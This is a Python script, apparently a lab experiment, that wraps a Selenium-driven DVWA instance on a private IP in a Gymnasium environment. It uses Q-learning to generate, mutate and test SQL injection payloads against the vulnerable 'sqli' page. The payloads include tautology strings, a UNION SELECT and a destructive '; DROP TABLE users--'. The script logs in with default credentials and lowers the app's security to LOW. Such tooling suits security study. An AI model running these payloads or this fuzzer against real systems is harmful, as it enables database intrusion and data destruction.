import gymnasium as gym
from gymnasium import spaces
import numpy as np
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select


class DVWAEnv(gym.Env):
    def __init__(self):
        super(DVWAEnv, self).__init__()

        self.base_url = "http://192.168.56.101/dvwa"
        self.login_url = self.base_url + "/login.php"
        self.target_url = self.base_url + "/vulnerabilities/sqli/"

        # Componentes para gerar payloads
        self.base_values = ["1", "admin", "test", "user"]
        self.sql_operators = ["'", '"', "''"]
        self.sql_conditions = ["OR", "AND"]
        self.sql_comparisons = ["=", "!=", "<", ">"]
        self.sql_values = ["1", "0", "'1'", "'a'", "true", "false"]
        self.sql_comments = ["--", "#", "/*"]

        # Histórico de payloads e recompensas
        self.payload_history = []
        self.reward_history = []

        # Gera payloads iniciais
        self.generate_initial_payloads()

        # Espaços de ação e estado
        self.action_space = spaces.Discrete(len(self.actions))
        self.observation_space = spaces.Discrete(1)

        self.driver = webdriver.Chrome()
        self.login()

    def login(self):
        """Faz login no DVWA e configura segurança"""
        self.driver.get(self.login_url)
        time.sleep(2)

        username = self.driver.find_element(By.NAME, "username")
        username.send_keys("admin")

        password = self.driver.find_element(By.NAME, "password")
        password.send_keys("password")
        password.send_keys(Keys.RETURN)

        time.sleep(2)
        print("✅ Login realizado no DVWA")

        # Configura segurança LOW
        self.driver.get(self.base_url + "/security.php")
        time.sleep(2)

        try:
            dropdown = Select(self.driver.find_element(By.NAME, "security"))
            dropdown.select_by_value("low")

            apply_button = self.driver.find_element(By.NAME, "seclev_submit")
            apply_button.click()

            time.sleep(2)
            print("✅ Nível de segurança alterado para LOW")

        except Exception as e:
            print("❌ Erro ao configurar segurança:", e)

    def generate_initial_payloads(self):
        """Gera payloads iniciais básicos"""
        self.actions = [
            "1",
            "1' OR '1'='1",
            "1' OR 1=1 --",
            "admin",
            "1' OR 'a'='a",
            "1 AND 1=1",
            "' OR 1=1 --",
            "1' UNION SELECT 1--",
            "'; DROP TABLE users--",
            "1' OR (SELECT COUNT(*) FROM users)>0--"
        ]

    def generate_payload(self, strategy="random"):
        """Gera um novo payload baseado em estratégia"""

        if strategy == "random":
            return self.generate_random_payload()
        elif strategy == "mutation":
            return self.mutate_successful_payload()
        elif strategy == "combination":
            return self.combine_successful_patterns()
        else:
            return self.generate_adaptive_payload()

    def generate_random_payload(self):
        """Gera payload completamente aleatório"""

        # Escolhe componentes aleatórios
        base = random.choice(self.base_values)
        operator = random.choice(self.sql_operators)

        # 50% chance de adicionar condição
        if random.random() < 0.5:
            condition = random.choice(self.sql_conditions)
            comparison = random.choice(self.sql_comparisons)
            value = random.choice(self.sql_values)
            comment = random.choice(self.sql_comments) if random.random() < 0.7 else ""

            payload = f"{base}{operator} {condition} {base}{comparison}{value} {comment}"
        else:
            payload = f"{base}{operator}"

        return payload

    def mutate_successful_payload(self):
        """Mutates payloads que tiveram boas recompensas"""

        if len(self.payload_history) < 3:
            return self.generate_random_payload()

        # Pega os 3 melhores payloads
        best_indices = np.argsort(self.reward_history)[-3:]
        best_payloads = [self.payload_history[i] for i in best_indices]

        # Escolhe um para mutar
        base_payload = random.choice(best_payloads)

        # Estratégias de mutação
        mutations = [
            lambda p: p.replace("--", "#"),  # Troca comentário
            lambda p: p.replace("'", '"'),  # Troca aspas
            lambda p: p + " AND 1=1",  # Adiciona condição
            lambda p: p.replace("OR", "AND"),  # Troca operador
            lambda p: p.replace("1", "admin")  # Troca valor
        ]

        mutation = random.choice(mutations)

        try:
            return mutation(base_payload)
        except:
            return self.generate_random_payload()

    def combine_successful_patterns(self):
        """Combina padrões de payloads bem-sucedidos"""

        if len(self.payload_history) < 2:
            return self.generate_random_payload()

        # Pega padrões de sucesso
        successful_payloads = []
        for i, reward in enumerate(self.reward_history):
            if reward > 0:
                successful_payloads.append(self.payload_history[i])

        if len(successful_payloads) < 2:
            return self.generate_random_payload()

        # Extrai componentes dos payloads bem-sucedidos
        patterns = []
        for payload in successful_payloads[:3]:  # Pega só os 3 melhores
            if "OR" in payload:
                patterns.append("OR")
            if "AND" in payload:
                patterns.append("AND")
            if "'" in payload:
                patterns.append("'")
            if '"' in payload:
                patterns.append('"')
            if "--" in payload:
                patterns.append("--")

        # Combina padrões
        if len(patterns) >= 2:
            base = random.choice(self.base_values)
            operator = random.choice(self.sql_operators)
            condition = random.choice([p for p in patterns if p in ["OR", "AND"]] or ["OR"])
            comparison = random.choice(self.sql_comparisons)
            value = random.choice(self.sql_values)
            comment = random.choice([p for p in patterns if p in ["--", "#"]] or ["--"])

            return f"{base}{operator} {condition} {base}{comparison}{value} {comment}"

        return self.generate_random_payload()

    def generate_adaptive_payload(self):
        """Gera payload baseado no histórico de recompensas"""

        if len(self.reward_history) == 0:
            return self.generate_random_payload()

        # Analisa quais padrões deram mais recompensa
        pattern_rewards = {}

        for i, payload in enumerate(self.payload_history):
            reward = self.reward_history[i]

            # Detecta padrões no payload
            if "OR" in payload:
                pattern_rewards["OR"] = pattern_rewards.get("OR", 0) + reward
            if "AND" in payload:
                pattern_rewards["AND"] = pattern_rewards.get("AND", 0) + reward
            if "'" in payload:
                pattern_rewards["single_quote"] = pattern_rewards.get("single_quote", 0) + reward
            if '"' in payload:
                pattern_rewards["double_quote"] = pattern_rewards.get("double_quote", 0) + reward
            if "--" in payload:
                pattern_rewards["dash_comment"] = pattern_rewards.get("dash_comment", 0) + reward
            if "#" in payload:
                pattern_rewards["hash_comment"] = pattern_rewards.get("hash_comment", 0) + reward

        # Escolhe os melhores padrões
        if pattern_rewards:
            best_pattern = max(pattern_rewards, key=pattern_rewards.get)

            # Gera payload usando o melhor padrão
            if best_pattern == "OR":
                return f"{random.choice(self.base_values)}' OR {random.choice(self.sql_values)}={random.choice(self.sql_values)} --"
            elif best_pattern == "AND":
                return f"{random.choice(self.base_values)}' AND {random.choice(self.sql_values)}={random.choice(self.sql_values)}"
            elif best_pattern == "single_quote":
                return f"{random.choice(self.base_values)}' OR 1=1 --"
            elif best_pattern == "double_quote":
                return f'{random.choice(self.base_values)}" OR 1=1 --'

        return self.generate_random_payload()

    def add_new_payload(self, payload):
        """Adiciona um novo payload à lista de ações"""
        if payload not in self.actions:
            self.actions.append(payload)
            self.action_space = spaces.Discrete(len(self.actions))
            print(f"🆕 Novo payload adicionado: {payload}")

    def step(self, action):
        # Se ação for maior que a lista atual, gera novo payload
        if action >= len(self.actions):
            # Escolhe estratégia de geração baseada no progresso
            if len(self.payload_history) < 10:
                strategy = "random"
            elif len(self.payload_history) < 25:
                strategy = "mutation"
            else:
                strategy = "adaptive"

            payload = self.generate_payload(strategy)
            self.add_new_payload(payload)
            action = len(self.actions) - 1  # Usa o novo payload
        else:
            payload = self.actions[action]

        self.driver.get(self.target_url)
        time.sleep(2)

        try:
            input_box = self.driver.find_element(By.NAME, "id")
            input_box.clear()
            input_box.send_keys(payload)
            input_box.send_keys(Keys.RETURN)

            time.sleep(2)

            page_source = self.driver.page_source.lower()

            if "sql" in page_source or "error" in page_source:
                reward = 2
            elif "mysql" in page_source:
                reward = 3
            else:
                reward = -1

        except:
            reward = -1

        # Salva no histórico
        self.payload_history.append(payload)
        self.reward_history.append(reward)

        state = 0
        done = False

        return state, reward, done, False, {}

    def reset(self, seed=None, options=None):
        return 0, {}

    def close(self):
        self.driver.quit()

    def get_statistics(self):
        """Retorna estatísticas dos payloads testados"""
        if not self.payload_history:
            return "Nenhum payload testado ainda"

        stats = {
            "total_payloads": len(self.payload_history),
            "unique_payloads": len(set(self.payload_history)),
            "best_reward": max(self.reward_history),
            "worst_reward": min(self.reward_history),
            "avg_reward": np.mean(self.reward_history),
            "successful_payloads": len([r for r in self.reward_history if r > 0])
        }

        return stats


# =============== TREINAMENTO COM GERAÇÃO DINÂMICA ===============

env = DVWAEnv()

# Q-table inicial (vai crescer dinamicamente)
q_table = np.zeros((1, env.action_space.n))

alpha = 0.7
gamma = 0.9
epsilon = 1.0
epsilon_decay = 0.99
epsilon_min = 0.05
episodes = 50

# Controle de geração de payloads
payload_generation_interval = 5  # Gera novo payload a cada 5 episódios
next_generation_episode = 5

print("🚀 Iniciando treinamento com geração dinâmica de payloads...")
print(f"Payloads iniciais: {len(env.actions)}")

for episode in range(episodes):
    state, _ = env.reset()

    # Decide se explora ou explota
    if random.uniform(0, 1) < epsilon:
        # Exploração: às vezes gera payload novo
        if episode >= next_generation_episode and random.random() < 0.3:
            # Força geração de novo payload
            action = env.action_space.n  # Ação fora do range atual
            print(f"🎲 Episódio {episode}: Gerando novo payload...")
            next_generation_episode += payload_generation_interval
        else:
            action = env.action_space.sample()
    else:
        action = np.argmax(q_table[state])

    # Se a Q-table não for grande o suficiente, expande
    if action >= q_table.shape[1]:
        # Expande a Q-table
        old_shape = q_table.shape
        q_table = np.pad(q_table, ((0, 0), (0, action - q_table.shape[1] + 1)), 'constant')
        print(f"📈 Q-table expandida: {old_shape} → {q_table.shape}")

    next_state, reward, done, _, _ = env.step(action)

    old_value = q_table[state, action]
    next_max = np.max(q_table[next_state])

    q_table[state, action] = old_value + alpha * (reward + gamma * next_max - old_value)

    epsilon = max(epsilon_min, epsilon * epsilon_decay)

    # Proteção contra índice inválido
    if action >= len(env.actions):
        print(f"⚠️ Ação {action} inválida, usando ação aleatória")
        action = random.randint(0, len(env.actions) - 1)

    print(f"[{episode}] Payload: {env.actions[action][:50]}... | Reward: {reward} | Total payloads: {len(env.actions)}")

# =============== RESULTADOS FINAIS ===============

best_action = np.argmax(q_table[0])
print("\n🏆 MELHOR PAYLOAD ENCONTRADO:")
print(env.actions[best_action])

print("\n📊 ESTATÍSTICAS FINAIS:")
stats = env.get_statistics()
for key, value in stats.items():
    print(f"  {key}: {value}")

print("\n🔍 TOP 5 PAYLOADS TESTADOS:")
# Pega os 5 melhores payloads
top_indices = np.argsort(env.reward_history)[-5:]
for i, idx in enumerate(reversed(top_indices)):
    payload = env.payload_history[idx]
    reward = env.reward_history[idx]
    print(f"  {i + 1}. {payload[:60]}... (Reward: {reward})")
